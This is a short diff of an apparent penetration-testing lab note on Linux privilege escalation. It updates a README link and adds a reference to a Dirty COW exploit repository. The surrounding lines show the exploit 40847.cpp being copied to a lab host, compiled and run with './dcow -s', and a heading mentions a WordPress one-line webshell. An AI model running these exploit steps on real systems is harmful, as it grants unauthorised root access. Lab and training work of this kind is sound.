@@ -1,7 +1,7 @@
 Penetration Test - Privilege Escalation
 ===
 
-🔙 [MENU README](../README.md)
+🔙 [MENU README](../README.md#note)
 
 
 # iLab
@@ -111,7 +111,9 @@ scp 40847.cpp aleksander@192.168.0.70:~/.
 g++ -Wall -pedantic -02 -std=c++11 -pthread -o dcow 40847.cpp -lutil
 ./dcow -s
 ```
-
+```bash
+# https://github.com/FireFart/dirtycow/blob/master/README.md
+```
 
 # Egress Busting (Remote Control)
 Ubuntu(Wordpress)一句話木馬
